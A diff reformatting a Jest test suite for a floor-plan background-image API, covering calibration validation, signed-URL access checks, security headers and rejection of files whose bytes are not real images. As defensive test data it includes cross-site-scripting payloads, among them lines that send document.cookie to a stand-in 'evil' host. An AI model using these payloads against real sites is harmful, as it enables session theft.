@@ -19,7 +19,8 @@ import {
 } from './plan-fixtures';
 
 const HTML = '<!doctype html><script>fetch("/x?c="+document.cookie)</script>';
-const SVG = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>';
+const SVG =
+  '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>';
 
 /**
  * F1c · Plano de planta · fondo importado (CONTRATO-PLANO §1.6), contra la base y
@@ -38,20 +39,31 @@ describe('Infraestructura F1c · plano · fondo calibrado', () => {
   let otra: PlanOrg;
   let plan: any;
 
-  const filas = (text: string, params: unknown[] = []) => sql<any>(ctx, text, params);
+  const filas = (text: string, params: unknown[] = []) =>
+    sql<any>(ctx, text, params);
 
   /** Sube una imagen propia y única (el almacenamiento es por contenido). */
   let semilla = 0;
   async function subirPng(o: PlanOrg = org, w = 100, h = 50) {
     semilla += 1;
     const png = makePngForTest(w + semilla, h);
-    const up = await uploadImage(ctx, o.token, o.tenantId, png, `plano-${semilla}.png`, 'image/png');
+    const up = await uploadImage(
+      ctx,
+      o.token,
+      o.tenantId,
+      png,
+      `plano-${semilla}.png`,
+      'image/png',
+    );
     expect(up.status).toBe(201);
     return { id: up.id as string, png };
   }
 
   /** Reescribe los bytes guardados de un archivo (simula contenido distinto al validado). */
-  async function alterarBytes(fileId: string, contenido: string): Promise<void> {
+  async function alterarBytes(
+    fileId: string,
+    contenido: string,
+  ): Promise<void> {
     const [v] = await filas(
       `select v.storage_uri from common.file_versions v join common.files f on f.current_version_id = v.id where f.id = ?`,
       [fileId],
@@ -62,14 +74,23 @@ describe('Infraestructura F1c · plano · fondo calibrado', () => {
   }
 
   const calibracion = {
-    calibration: { p1: { px: 0, py: 0 }, p2: { px: 100, py: 0 }, distanceM: 10 },
+    calibration: {
+      p1: { px: 0, py: 0 },
+      p2: { px: 100, py: 0 },
+      distanceM: 10,
+    },
     offsetXM: 1,
     offsetYM: 2,
     rotationDeg: 0,
     opacity: 0.6,
   };
 
-  const fijar = (fileId: string, body: Record<string, unknown> = calibracion, rowVersion?: number, o = org) =>
+  const fijar = (
+    fileId: string,
+    body: Record<string, unknown> = calibracion,
+    rowVersion?: number,
+    o = org,
+  ) =>
     http()
       .put(`/floor-plans/${plan.id}/background`)
       .set(como(o.token, o.tenantId))
@@ -77,7 +98,12 @@ describe('Infraestructura F1c · plano · fondo calibrado', () => {
       .send({ fileId, ...body });
 
   const plano = async () =>
-    (await http().get(`/floor-plans/${plan.id}`).set(comoDueno(org)).expect(200)).body;
+    (
+      await http()
+        .get(`/floor-plans/${plan.id}`)
+        .set(comoDueno(org))
+        .expect(200)
+    ).body;
 
   beforeAll(async () => {
     ctx = await bootstrapTestApp();
@@ -100,7 +126,13 @@ describe('Infraestructura F1c · plano · fondo calibrado', () => {
       await http()
         .post(`/sites/${org.siteId}/floor-plans`)
         .set(comoDueno(org))
-        .send({ code: 'FONDO-1', name: 'Con fondo', anchorSpaceId: piso.id, widthM: 40, heightM: 20 })
+        .send({
+          code: 'FONDO-1',
+          name: 'Con fondo',
+          anchorSpaceId: piso.id,
+          widthM: 40,
+          heightM: 20,
+        })
         .expect(201)
     ).body;
   });
@@ -120,15 +152,22 @@ describe('Infraestructura F1c · plano · fondo calibrado', () => {
       offsetXM: 1,
       offsetYM: 2,
       opacity: 0.6,
-      url: expect.stringMatching(new RegExp(`^/floor-plans/${plan.id}/background/content\\?v=`)),
+      url: expect.stringMatching(
+        new RegExp(`^/floor-plans/${plan.id}/background/content\\?v=`),
+      ),
     });
     expect(res.body.image).toMatchObject({ mimeType: 'image/png', height: 50 });
     expect(JSON.stringify(res.body)).not.toContain(id);
 
-    const bytes = await http().get(plan.background.url).set(comoDueno(org)).expect(200);
+    const bytes = await http()
+      .get(plan.background.url)
+      .set(comoDueno(org))
+      .expect(200);
     expect(bytes.headers['content-type']).toMatch(/^image\/png/);
     expect(bytes.headers['x-content-type-options']).toBe('nosniff');
-    expect(bytes.headers['content-security-policy']).toBe("default-src 'none'; sandbox");
+    expect(bytes.headers['content-security-policy']).toBe(
+      "default-src 'none'; sandbox",
+    );
     expect(bytes.headers['cache-control']).toMatch(/^private, max-age=/);
     expect(Buffer.compare(bytes.body, png)).toBe(0);
     // Queda en la historia y en el outbox.
@@ -138,8 +177,13 @@ describe('Infraestructura F1c · plano · fondo calibrado', () => {
     );
     expect(ev).toEqual([{ c: 'SET' }]);
     // El layout también la entrega.
-    const layout = await http().get(`/floor-plans/${plan.id}/layout`).set(comoDueno(org)).expect(200);
-    expect(layout.body.floorPlan.background.url).toContain('/background/content?');
+    const layout = await http()
+      .get(`/floor-plans/${plan.id}/layout`)
+      .set(comoDueno(org))
+      .expect(200);
+    expect(layout.body.floorPlan.background.url).toContain(
+      '/background/content?',
+    );
   });
 
   it('la URL exige sesión y lectura de la sede: sin token 401, otro tenant 404, firma alterada 403', async () => {
@@ -157,9 +201,21 @@ describe('Infraestructura F1c · plano · fondo calibrado', () => {
     const { id } = await subirPng();
     const rv = (await plano()).rowVersion;
     for (const body of [
-      { calibration: { p1: { px: 5, py: 5 }, p2: { px: 5, py: 5 }, distanceM: 10 } },
+      {
+        calibration: {
+          p1: { px: 5, py: 5 },
+          p2: { px: 5, py: 5 },
+          distanceM: 10,
+        },
+      },
       { calibration: calibracion.calibration, scaleMPerPx: 0.1 },
-      { calibration: { p1: { px: 0, py: 0 }, p2: { px: 10, py: 0 }, distanceM: 0 } },
+      {
+        calibration: {
+          p1: { px: 0, py: 0 },
+          p2: { px: 10, py: 0 },
+          distanceM: 0,
+        },
+      },
       {},
       { scaleMPerPx: 5000 },
     ]) {
@@ -193,30 +249,42 @@ describe('Infraestructura F1c · plano · fondo calibrado', () => {
     ['HTML con script', HTML],
     ['SVG con script', SVG],
     ['JavaScript', 'document.location="//evil/?"+document.cookie'],
-  ])('al adjuntar: %s declarado como image/png y subido como .png se rechaza', async (_n, contenido) => {
-    const { id } = await subirPng();
-    await alterarBytes(id, contenido);
-    const antes = (await plano()).background;
-    const res = await fijar(id, calibracion, (await plano()).rowVersion).expect(422);
-    expect(res.body.reason).toBe('BACKGROUND_FILE_INVALID');
-    expect(res.body.details.cause).toBe('MIME');
-    expect((await plano()).background?.url?.split('?')[0]).toBe(antes?.url?.split('?')[0]);
-  });
+  ])(
+    'al adjuntar: %s declarado como image/png y subido como .png se rechaza',
+    async (_n, contenido) => {
+      const { id } = await subirPng();
+      await alterarBytes(id, contenido);
+      const antes = (await plano()).background;
+      const res = await fijar(
+        id,
+        calibracion,
+        (await plano()).rowVersion,
+      ).expect(422);
+      expect(res.body.reason).toBe('BACKGROUND_FILE_INVALID');
+      expect(res.body.details.cause).toBe('MIME');
+      expect((await plano()).background?.url?.split('?')[0]).toBe(
+        antes?.url?.split('?')[0],
+      );
+    },
+  );
 
   it.each([
     ['HTML con script', HTML],
     ['SVG con script', SVG],
-  ])('al servir: si los bytes dejan de ser una imagen (%s), la URL firmada no los sirve ni como image/png ni como nada', async (_n, contenido) => {
-    const { id } = await subirPng();
-    await fijar(id, calibracion, (await plano()).rowVersion).expect(200);
-    const url = (await plano()).background.url as string;
-    await http().get(url).set(comoDueno(org)).expect(200); // todavía es el PNG
-    await alterarBytes(id, contenido);
-    const res = await http().get(url).set(comoDueno(org)).expect(422);
-    expect(res.body.reason).toBe('BACKGROUND_FILE_INVALID');
-    expect(res.headers['content-type']).not.toMatch(/image\/png|html|svg/);
-    expect(JSON.stringify(res.body)).not.toContain('<script');
-  });
+  ])(
+    'al servir: si los bytes dejan de ser una imagen (%s), la URL firmada no los sirve ni como image/png ni como nada',
+    async (_n, contenido) => {
+      const { id } = await subirPng();
+      await fijar(id, calibracion, (await plano()).rowVersion).expect(200);
+      const url = (await plano()).background.url as string;
+      await http().get(url).set(comoDueno(org)).expect(200); // todavía es el PNG
+      await alterarBytes(id, contenido);
+      const res = await http().get(url).set(comoDueno(org)).expect(422);
+      expect(res.body.reason).toBe('BACKGROUND_FILE_INVALID');
+      expect(res.headers['content-type']).not.toMatch(/image\/png|html|svg/);
+      expect(JSON.stringify(res.body)).not.toContain('<script');
+    },
+  );
 
   it('un archivo reemplazado después de adjuntarlo no se sirve bajo la URL firmada vieja', async () => {
     const { id } = await subirPng();
@@ -225,7 +293,14 @@ describe('Infraestructura F1c · plano · fondo calibrado', () => {
     await http().get(vieja).set(comoDueno(org)).expect(200);
     // Nueva versión del mismo archivo (otra imagen válida) como vigente.
     const nueva = makePngForTest(77, 33);
-    const up = await uploadImage(ctx, org.token, org.tenantId, nueva, 'nueva.png', 'image/png');
+    const up = await uploadImage(
+      ctx,
+      org.token,
+      org.tenantId,
+      nueva,
+      'nueva.png',
+      'image/png',
+    );
     const [origen] = await filas(
       `select v.* from common.file_versions v join common.files f on f.current_version_id = v.id where f.id = ?`,
       [up.id],
@@ -240,7 +315,10 @@ describe('Infraestructura F1c · plano · fondo calibrado', () => {
          from common.file_versions where id = ?::uuid`,
       [nuevaVersion, id, origen.id],
     );
-    await filas('update common.files set current_version_id = ?::uuid where id = ?::uuid', [nuevaVersion, id]);
+    await filas(
+      'update common.files set current_version_id = ?::uuid where id = ?::uuid',
+      [nuevaVersion, id],
+    );
     const res = await http().get(vieja).set(comoDueno(org)).expect(422);
     expect(res.body.reason).toBe('BACKGROUND_URL_INVALID');
     // El lienzo entrega la URL de la versión vigente, y esa sí sirve.
@@ -268,10 +346,10 @@ describe('Infraestructura F1c · plano · fondo calibrado', () => {
       [CONCEPTS.SCAN_CLEAN, id],
     );
     expect((await plano()).background).not.toBeNull();
-    await filas('update common.files set deleted_at = now(), lifecycle_status_concept_id = ?::uuid where id = ?::uuid', [
-      CONCEPTS.FILE_DELETED,
-      id,
-    ]);
+    await filas(
+      'update common.files set deleted_at = now(), lifecycle_status_concept_id = ?::uuid where id = ?::uuid',
+      [CONCEPTS.FILE_DELETED, id],
+    );
     expect((await plano()).background).toBeNull();
     await http().get(url).set(comoDueno(org)).expect(422);
     await fijar(id, calibracion, (await plano()).rowVersion).expect(422);
@@ -284,11 +362,17 @@ describe('Infraestructura F1c · plano · fondo calibrado', () => {
       [org.practiceId],
     );
     const { id } = await subirPng(org, 120, 40);
-    const res = await fijar(id, calibracion, (await plano()).rowVersion).expect(422);
-    expect(res.body.details).toMatchObject({ cause: 'TOO_LARGE_PX', maxPx: 50 });
-    await filas(`delete from practice.practice_settings where practice_id = ?::uuid and setting_key = 'infra.plan.background.max_px'`, [
-      org.practiceId,
-    ]);
+    const res = await fijar(id, calibracion, (await plano()).rowVersion).expect(
+      422,
+    );
+    expect(res.body.details).toMatchObject({
+      cause: 'TOO_LARGE_PX',
+      maxPx: 50,
+    });
+    await filas(
+      `delete from practice.practice_settings where practice_id = ?::uuid and setting_key = 'infra.plan.background.max_px'`,
+      [org.practiceId],
+    );
   });
 
   it('quitar el fondo borra la referencia (el archivo sigue); sin fondo la URL antigua da 404', async () => {
@@ -301,7 +385,10 @@ describe('Infraestructura F1c · plano · fondo calibrado', () => {
       .set(ifMatch((await plano()).rowVersion))
       .expect(200);
     expect(quitado.body.background).toBeNull();
-    const [archivo] = await filas('select deleted_at from common.files where id = ?', [id]);
+    const [archivo] = await filas(
+      'select deleted_at from common.files where id = ?',
+      [id],
+    );
     expect(archivo.deleted_at).toBeNull();
     await http().get(url).set(comoDueno(org)).expect(404);
     const [{ n }] = await filas(
